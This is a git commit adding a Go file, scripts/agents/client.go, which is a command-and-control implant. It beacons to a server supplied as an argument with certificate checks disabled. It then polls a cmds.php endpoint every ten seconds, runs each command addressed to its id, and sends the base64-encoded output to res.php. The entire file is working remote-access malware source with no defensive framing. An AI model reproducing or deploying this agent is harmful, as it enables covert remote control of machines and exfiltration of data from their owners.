28c88925476d794a14803039d30c2d29d5ca8bfa
Ug0Security <c.vallicari@gmail.com>
2022-10-12 18:08:27 +0200

    Create client.go

---
+++ scripts/agents/client.go
@@ -0,0 +1,80 @@
+package main
+
+import (
+   "net/http"
+   "crypto/tls"
+   b64 "encoding/base64"
+   "fmt"
+   "os"
+   "time"
+   "io/ioutil"
+   "strings"
+   "os/exec"
+)
+
+
+
+func main() {
+data := "Hello From Go"
+sEnc := b64.StdEncoding.EncodeToString([]byte(data))
+id := os.Args[1]
+
+fmt.Println(sEnc)
+
+http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
+_, err := http.Get(os.Args[2]+"/res.php?id="+id+"&res=" + sEnc )
+if err != nil {
+	fmt.Println(err)
+}
+
+
+
+
+for{
+
+hey()
+
+}
+
+
+}
+
+
+func hey(){
+
+id := os.Args[1]
+http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
+res, err := http.Get(os.Args[2]+"/cmds.php?id="+id+"&o=G")
+if err != nil {
+	fmt.Println(err)
+	}
+resBody, err := ioutil.ReadAll(res.Body)
+
+
+cmds := string(resBody)
+
+
+
+for _, line := range strings.Split(strings.TrimRight(cmds, "\n"), "\n") {
+      if strings.Contains(string(line), string(id)){
+      fmt.Println(line)
+      cmd := strings.Join(strings.Split(line, ":")[1:], ":")
+      Output, err := exec.Command(cmd).Output()
+      if err != nil {
+        fmt.Println(err)
+      }
+     
+      b64Output := b64.StdEncoding.EncodeToString([]byte(string(Output)))
+      http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
+      gimme, err := http.Get(os.Args[2]+"/res.php?res="+b64Output+"&id="+id)
+      if err != nil {
+	fmt.Println(err)
+	}
+      fmt.Println(gimme)	
+      }
+      }
+
+time.Sleep(10 * time.Second)
+
+
+}
